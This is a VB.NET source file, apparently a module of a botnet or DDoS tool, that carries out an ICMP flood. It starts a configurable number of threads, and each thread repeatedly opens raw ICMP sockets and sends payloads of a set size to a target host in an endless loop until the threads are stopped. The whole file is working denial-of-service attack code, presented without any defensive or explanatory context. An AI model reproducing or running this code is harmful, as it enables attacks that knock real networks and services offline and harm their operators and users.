﻿Imports System.Net
Imports System.Threading
Imports System.Net.Sockets

Public Class ICMP
    Friend Shared tFloodingJob As ThreadStart()
    Friend Shared tFloodingThread As Thread()
    Friend Shared sFHost As String
    Friend Shared iICMPSockets As Integer
    Friend Shared IPEo As IPEndPoint
    Friend Shared iPSize As Integer
    Friend Shared ICMPClass As ICMPRequest()
    Friend Shared iThreads As Integer

    Friend Shared Sub StartICMPFlood()
        Try
            IPEo = New IPEndPoint(Dns.GetHostEntry(sFHost).AddressList(0), 0)
        Catch
            IPEo = New IPEndPoint(IPAddress.Parse(sFHost), 0)
        End Try

        tFloodingThread = New Thread(iThreads - 1) {}
        tFloodingJob = New ThreadStart(iThreads - 1) {}
        ICMPClass = New ICMPRequest(iThreads - 1) {}

        For i As Integer = 0 To iThreads - 1
            ICMPClass(i) = New ICMPRequest(IPEo, iICMPSockets, iPSize)
            tFloodingJob(i) = New ThreadStart(AddressOf ICMPClass(i).Send)
            tFloodingThread(i) = New Thread(tFloodingJob(i))
            tFloodingThread(i).Start()
        Next
    End Sub

    Friend Shared Sub StopICMPFlood()
        For i As Integer = 0 To iThreads - 1
            Try
                tFloodingThread(i).Abort()
                tFloodingThread(i).Join()
            Catch
            End Try
        Next
    End Sub

    Friend Class ICMPRequest
        Private iICMPSockets As Integer
        Private IPEo As IPEndPoint
        Private iPSize As Integer
        Private pSocket As Socket()

        Friend Sub New(ByVal tIPEo As IPEndPoint, ByVal tICMPSockets As Integer, ByVal tPSize As Integer)
            Me.IPEo = tIPEo
            Me.iICMPSockets = tICMPSockets
            Me.iPSize = tPSize
        End Sub

        Friend Sub Send()
            Dim iNum As Integer
            Dim rBuffer As Byte() = New Byte(Me.iPSize - 1) {}
Label:
            Try
                Me.pSocket = New Socket(Me.iICMPSockets - 1) {}

                For iNum = 0 To Me.iICMPSockets - 1
                    Me.pSocket(iNum) = New Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp)
                    Me.pSocket(iNum).Blocking = False
                    Me.pSocket(iNum).SendTo(rBuffer, Me.IPEo)
                Next

                Thread.Sleep(100)

                For iNum = 0 To Me.iICMPSockets - 1
                    If Me.pSocket(iNum).Connected Then
                        Me.pSocket(iNum).Disconnect(False)
                    End If
                    Me.pSocket(iNum).Close()
                    Me.pSocket(iNum) = Nothing
                Next

                Me.pSocket = Nothing
                GoTo Label
            Catch
                For iNum = 0 To Me.iICMPSockets - 1
                    Try
                        If Me.pSocket(iNum).Connected Then
                            Me.pSocket(iNum).Disconnect(False)
                        End If
                        Me.pSocket(iNum).Close()
                        Me.pSocket(iNum) = Nothing
                    Catch
                    End Try
                Next
                GoTo Label
            End Try
        End Sub
    End Class
End Class

